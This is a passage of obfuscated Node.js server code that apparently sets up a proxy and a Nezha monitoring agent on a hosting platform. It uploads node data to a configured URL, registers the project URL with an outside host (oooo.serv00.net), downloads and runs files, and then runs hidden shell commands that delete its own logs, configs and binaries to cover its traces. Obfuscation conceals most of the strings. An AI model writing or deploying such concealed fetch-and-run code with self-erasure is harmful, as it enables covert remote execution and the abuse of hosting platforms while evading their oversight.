axios[_0x16cfb0(0xe0)](UPLOAD_URL+'/api/add-nodes',_0x4f2e90,{'headers':{'Content-Type':_0x16cfb0(0x117)}});return _0xe228f7&&_0xe228f7[_0x16cfb0(0x18b)]===0xc8?(console[_0x16cfb0(0xdf)]('Nodes\x20uploaded\x20successfully'),_0xe228f7):null;}catch(_0x8c4df6){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x44ab79=_0x2842,_0x57a20e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x57a20e[_0x44ab79(0x106)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x57a20e[_0x44ab79(0x106)](phpPath);process[_0x44ab79(0x150)]===_0x44ab79(0x159)?exec(_0x44ab79(0x130)+_0x57a20e['join']('\x20')+_0x44ab79(0x194),_0x3a445c=>{const _0xc8385b=_0x44ab79;console[_0xc8385b(0x107)](),console['log']('App\x20is\x20running'),console[_0xc8385b(0xdf)](_0xc8385b(0x131));}):exec(_0x44ab79(0x129)+_0x57a20e[_0x44ab79(0x193)]('\x20')+_0x44ab79(0x14c),_0x5b134f=>{const _0x2aaee3=_0x44ab79;console[_0x2aaee3(0x107)](),console[_0x2aaee3(0xdf)](_0x2aaee3(0xe9)),console[_0x2aaee3(0xdf)](_0x2aaee3(0x131));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1e3eb5=_0x183788;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1e3eb5(0xdf)](_0x1e3eb5(0x12f));return;}try{const _0x22d98b=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1e3eb5(0x117)}});return console[_0x1e3eb5(0xdf)](_0x1e3eb5(0x149)),_0x22d98b;}catch(_0x32c3f4){return console[_0x1e3eb5(0x15d)](_0x1e3eb5(0x166)+_0x32c3f4[_0x1e3eb5(0x133)]),null;}}async function startserver(){const _0x30af5c=_0x183788;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4b13db){console[_0x30af5c(0x15d)]('Error\x20in\x20startserver:',_0x4b13db);}}startserver()['catch'](_0x51fc65=>{const _0x1ade56=_0x183788;console['error'](_0x1ade56(0x138),_0x51fc65);}),app[_0x183788(0xeb)]('/',async function(_0x160d00,_0x359f5d){const _0x178e08=_0x183788;try{const _0x44ec12=path[_0x178e08(0x193)](__dirname,_0x178e08(0x11d)),_0x56870b=await fs[_0x178e08(0xd6)][_0x178e08(0xe8)](_0x44ec12,_0x178e08(0x186));_0x359f5d['send'](_0x56870b);}catch(_0x431803){_0x359f5d[_0x178e08(0x120)](_0x178e08(0xed));}}),app[_0x183788(0x114)](PORT,()=>console[_0x183788(0xdf)](_0x183788(0x165)+PORT+'!'));